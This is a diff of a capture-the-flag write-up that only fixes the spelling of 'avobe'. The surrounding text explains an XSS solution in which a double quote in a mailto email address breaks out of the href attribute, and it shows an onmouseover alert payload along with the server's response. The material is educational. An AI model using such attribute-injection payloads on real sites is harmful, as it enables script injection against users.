@@ -118,7 +118,7 @@ but <> characters are escaped by the server side
 ```html
 <a href="mailto:"&lt;svg/onload=alert(1)&gt;"@x.y">"&lt;svg/onload=alert(1)&gt;"@x.y</a>
 ```
-however " are not escaped, as we can see avobe we came out of href attribute. So changing the payload slightly to `"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y` we get a response like this
+however " are not escaped, as we can see above we came out of href attribute. So changing the payload slightly to `"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y` we get a response like this
 ```html
 <p id="notes-display" class="card-content" contenteditable="true">
 <a href="mailto:"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y">"onmouseover=alert('flag{THIS_IS_THE_FLAG}');"@x.y</a>
